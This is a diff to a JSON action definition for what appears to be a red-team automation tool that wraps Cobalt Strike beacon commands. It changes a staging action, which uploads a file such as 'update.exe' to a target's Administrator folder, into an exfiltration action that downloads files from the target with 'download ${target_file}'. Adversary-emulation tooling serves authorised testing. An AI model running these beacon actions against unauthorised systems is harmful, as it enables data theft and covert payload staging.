@@ -1,16 +1,17 @@
 {
-  "_key": "cs-upload-file",
-  "name": "Upload File",
-  "description": "Upload a file from operator machine to target via Cobalt Strike beacon",
-  "icon": "\u2b06\ufe0f",
-  "tactic": "TA0001",
+  "_key": "cs-download-file",
+  "name": "Download File",
+  "description": "Download a file from target to operator machine via Cobalt Strike beacon",
+  "icon": "\u2b07\ufe0f",
+  "tactic": "TA0009",
   "category": "Cobalt Strike",
-  "subcategory": "Staging",
+  "subcategory": "Exfiltration",
   "riskLevel": "Medium",
-  "estimatedDuration": 20,
+  "estimatedDuration": 30,
   "executionType": "cobalt_strike",
-  "robotKeyword": "Upload File",
-  "robotTemplate": "cobaltstrike.Upload File    ${session}    ${local_file}    ${upload_path}",
+  "robotKeyword": "Download File",
+  "robotTemplate": "${output}=    cobaltstrike.Download File    ${session}    ${target_file}",
+  "cobaltStrikeCommand": "download ${target_file}",
   "inputs": [
     {
       "id": "session",
@@ -35,18 +36,11 @@
       "placeholder": "${session}"
     },
     {
-      "id": "local_file",
-      "label": "Local File Path",
+      "id": "target_file",
+      "label": "Remote File Path",
       "type": "string",
       "required": true,
-      "placeholder": "${WORKDIR}/update.exe"
-    },
-    {
-      "id": "upload_path",
-      "label": "Remote Destination",
-      "type": "string",
-      "required": true,
-      "placeholder": "C:\\Users\\Administrator\\Downloads\\update.exe"
+      "placeholder": "C:\\Windows\\Temp\\tmp.zip"
     }
   ],
   "requirements": {
@@ -56,7 +50,8 @@
     "libraries": [
       "cobaltstrikec2/cobaltstrike.py"
     ],
-    "keyword": "Upload File",
+    "keyword": "Download File",
+    "captureOutput": "DOWNLOAD_RESULT",
     "keywordArgs": [
       {
         "position": 1,
@@ -64,14 +59,10 @@
       },
       {
         "position": 2,
-        "param": "local_file"
-      },
-      {
-        "position": 3,
-        "param": "upload_path"
+        "param": "target_file"
       }
     ],
     "variables": [],
-    "preKeywordLog": "Uploading ${local_file}"
+    "preKeywordLog": "Downloading ${target_file}"
   }
 }
